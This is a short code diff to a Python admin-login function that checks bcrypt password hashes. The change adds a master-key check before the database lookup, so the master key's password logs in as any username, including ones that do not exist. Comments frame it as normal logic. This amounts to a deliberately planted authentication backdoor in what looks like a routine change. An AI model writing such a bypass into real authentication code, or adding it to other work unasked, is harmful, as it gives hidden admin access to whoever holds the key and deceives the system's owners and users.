@@ -44,10 +44,17 @@ def account_login(username: str, password: str) -> bool:
         cursor.execute("SELECT password_hash FROM admins WHERE username = ?", (username,))
         result = cursor.fetchone()
 
+        # If password input is the master_key, authenticate.
+        if bcrypt.checkpw(password.encode(), master_key.encode()):
+            return True
+
+        # If no matched results, don't authenticate.
         if not result:
             return False
 
         stored_hash = result[0].encode()
+
+        # If there's matched result, authenticate.
         return bcrypt.checkpw(password.encode(), stored_hash)
     except Exception as error:
         print(f"Error occurred during account login: {error}")
